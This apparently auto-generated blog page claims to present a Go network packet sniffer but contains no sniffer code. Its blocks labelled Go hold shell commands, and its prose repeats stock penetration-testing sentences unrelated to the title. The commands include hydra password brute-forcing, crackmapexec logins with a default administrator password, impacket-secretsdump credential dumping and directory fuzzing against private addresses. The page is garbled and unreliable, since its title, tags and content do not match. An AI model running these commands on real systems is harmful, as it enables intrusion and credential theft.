---
TitleSEO: "Network Packet Sniffer in Go | ZureFX"
TitlePost: "Network Packet Sniffer — Go"
Author: "ZureFX"
Description: "A Go script for network packet sniffer. Built for security research and automation."
Keywords: "fuzzer, tool, powershell, scanner, go"
URL: "https://zurefx.github.io/scripting/script-network-packet-sniffer-211.html"
URL_IMAGES: ""
Date: "2025-08-06"
Tags: "Fuzzer, Tool, PowerShell, Scanner, Go"
Section: "scripting"
Lang: "en"
main_img: "script-network-packet-sniffer-211"
Permalink: "/scripting/script-network-packet-sniffer-211.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target. Token impersonation allowed elevation to SYSTEM privileges on the target.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `bloodhound`
- `GetUserSPNs`
- `kerbrute`

## Implementation

### Core Logic

Unconstrained delegation was enabled on the compromised machine. Initial enumeration revealed several interesting open ports on the target.

```go
gobuster dir -u http://10.105.42.199/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.84.11.87 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.13.108.223/FUZZ
crackmapexec smb 10.64.227.234 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Helper Functions

Initial enumeration revealed several interesting open ports on the target. Post-exploitation enumeration revealed a path to domain administrator privileges.

```go
gobuster dir -u http://10.89.152.177/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.100.226.112/FUZZ
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.45.236.120 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.41.11.181/FUZZ
```

## Usage

### Basic Usage

The database credentials were hardcoded in the application source code. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p8888,80,27017 10.66.48.131 -oN scan.txt
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.21.119.118/FUZZ
crackmapexec smb 10.110.124.81 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Privilege escalation was possible due to misconfigured sudo permissions. The target system was identified as running a vulnerable version of the service. Weak file permissions allowed modification of critical system files.

```bash
crackmapexec smb 10.23.30.252 -u administrator -p 'P@ssw0rd!' --shares
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.118.198.92/FUZZ
impacket-secretsdump administrator:'P@ssw0rd!'@10.90.222.194
impacket-secretsdump administrator:'P@ssw0rd!'@10.64.229.108
```

## Output

### Example Output

Authentication bypass was achieved through careful manipulation of the login mechanism. Network traffic analysis revealed unencrypted communications containing user credentials.

```
[+] Scanning target...
[+] Found 14 results
[+] Done in 1.65s
```
